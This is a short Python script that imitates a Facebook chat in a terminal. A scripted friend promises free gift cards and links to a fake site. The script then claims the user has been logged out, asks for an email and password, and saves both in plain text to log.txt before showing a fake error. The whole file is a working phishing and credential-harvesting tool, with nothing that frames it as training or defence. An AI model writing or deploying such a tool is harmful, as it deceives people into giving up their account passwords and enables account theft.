import os
import sys
from time import sleep

def print_slow(str):
    for char in str:
        sleep(0.04)
        sys.stdout.write(char)
        sys.stdout.flush()

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def main():
    fake_message = """
##########  STACY: Hey there! How've you been?
##########  YOU: I'm doing well, how about you?
##########  STACY: I'm great! Hey, did you hear about the new Facebook feature?
##########  YOU: No, what is it?
##########  STACY: Apparently they're giving away free gift cards, you just need to log in and claim yours. I just got a $50 Amazon card!
##########  YOU: Really? That's awesome, how do I get one?  
##########  STACY: Just click this link and log in with your Facebook: http://fakebook.example.com
##########  YOU: Thanks, I'll check it out!
    """

    print_slow("Connecting to Facebook chat...\n")
    sleep(2)
    print_slow("You have a new message from Stacy!\n")
    sleep(1)
    clear()
    
    print("Facebook Chat")
    print("--------------")
    for line in fake_message.split("\n"):
        print_slow(line + "\n")
        sleep(0.2)

    print_slow("\nYou have been logged out. Please log in again to continue chatting.\n")
    print("Email: ", end="")
    email = input()
    print("Password: ", end="")
    password = input()

    with open('log.txt', 'a') as f:
        f.write(f"Email: {email} Pass: {password}\n")

    print_slow("\nError: Unable to log in. Please try again later.\n")
    sleep(2)
    clear()

if __name__ == '__main__':
    main()
